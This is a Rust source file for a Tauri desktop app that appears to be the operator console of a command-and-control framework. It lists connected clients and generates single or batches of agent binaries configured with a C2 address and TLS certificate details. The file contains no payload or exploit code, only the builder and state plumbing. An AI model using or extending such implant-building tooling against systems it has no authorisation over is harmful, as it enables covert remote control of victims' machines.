use c2_generator::AgentGenerator;
use protocol::config::AgentConfig;
use std::sync::{Arc, Mutex};

mod embedded_agent;

pub struct AppState {
    pub clients: Arc<Mutex<Vec<String>>>,
    pub logs: Arc<Mutex<Vec<String>>>,
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            clients: Arc::new(Mutex::new(vec![])),
            logs: Arc::new(Mutex::new(vec!["System initialized...".to_string()])),
        }
    }
}

impl AppState {
    fn add_client(&self, id: &str) -> String {
        let mut clients = self.clients.lock().expect("AppState lock poisoned");
        clients.push(id.to_string());
        let msg = format!("Added client {id}");
        let mut logs = self.logs.lock().expect("AppState lock poisoned");
        logs.push(msg.clone());
        msg
    }

    fn add_log(&self, msg: &str) {
        let mut logs = self.logs.lock().expect("AppState lock poisoned");
        logs.push(msg.to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::AppState;

    #[test]
    fn adding_a_client_updates_clients_and_logs() {
        let state = AppState::default();
        let message = state.add_client("agent-1");

        assert_eq!(message, "Added client agent-1");
        assert_eq!(state.clients.lock().unwrap().as_slice(), ["agent-1"]);
        assert_eq!(
            state.logs.lock().unwrap().last().map(String::as_str),
            Some("Added client agent-1")
        );
    }
}

#[tauri::command]
fn add_client(state: tauri::State<'_, AppState>, id: String) -> String {
    let message = state.add_client(&id);
    log::info!("Added client {id}");
    message
}

#[tauri::command]
fn get_clients(state: tauri::State<'_, AppState>) -> Vec<String> {
    let clients = state.clients.lock().expect("AppState lock poisoned");
    clients.clone()
}

#[tauri::command]
fn get_logs(state: tauri::State<'_, AppState>) -> Vec<String> {
    let logs = state.logs.lock().expect("AppState lock poisoned");
    logs.clone()
}

#[derive(serde::Serialize)]
struct GenerateResult {
    success: bool,
    message: String,
    output_path: Option<String>,
}

#[tauri::command]
fn generate_agent(
    state: tauri::State<'_, AppState>,
    c2_address: String,
    cert_fingerprint: String,
    agent_id: u32,
    output: String,
    count: Option<u32>,
    cert_path: Option<String>,
    key_path: Option<String>,
) -> GenerateResult {
    let generator = if !embedded_agent::AGENT_TEMPLATE.is_empty() {
        match AgentGenerator::new(embedded_agent::AGENT_TEMPLATE.to_vec()) {
            Ok(g) => g,
            Err(e) => {
                let msg = format!("Failed to load embedded agent template: {e}");
                log::error!("{msg}");
                state.add_log(&msg);
                return GenerateResult {
                    success: false,
                    message: msg,
                    output_path: None,
                };
            }
        }
    } else {
        let msg = "No embedded agent template. Build agent-core first.".to_string();
        log::error!("{msg}");
        state.add_log(&msg);
        return GenerateResult {
            success: false,
            message: msg,
            output_path: None,
        };
    };

    let config = AgentConfig::with_tls_paths(
        c2_address,
        cert_fingerprint,
        agent_id,
        cert_path,
        key_path,
    );

    let count = count.unwrap_or(1);
    let output_path = std::path::PathBuf::from(&output);

    let result = if count > 1 {
        match generator.generate_batch(&config, &output_path, count) {
            Ok(paths) => {
                let names: Vec<String> = paths
                    .iter()
                    .map(|p| p.to_string_lossy().to_string())
                    .collect();
                let msg = format!(
                    "Generated {} agents: {}",
                    count,
                    names.join(", ")
                );
                state.add_log(&msg);
                GenerateResult {
                    success: true,
                    message: msg,
                    output_path: Some(names.join(", ")),
                }
            }
            Err(e) => {
                let msg = format!("Batch generation failed: {e}");
                state.add_log(&msg);
                GenerateResult {
                    success: false,
                    message: msg,
                    output_path: None,
                }
            }
        }
    } else {
        let output = std::path::Path::new(&output);
        match generator.generate(&config, output) {
            Ok(()) => {
                let msg = format!(
                    "Agent {agent_id} generated at {path}",
                    path = output.display()
                );
                state.add_log(&msg);
                GenerateResult {
                    success: true,
                    message: msg,
                    output_path: Some(output.to_string_lossy().to_string()),
                }
            }
            Err(e) => {
                let msg = format!("Generation failed: {e}");
                state.add_log(&msg);
                GenerateResult {
                    success: false,
                    message: msg,
                    output_path: None,
                }
            }
        }
    };

    log::info!("{}", result.message);
    result
}

fn main() {
    tauri::Builder::default()
        .manage(AppState::default())
        .invoke_handler(tauri::generate_handler![
            add_client,
            get_clients,
            get_logs,
            generate_agent,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
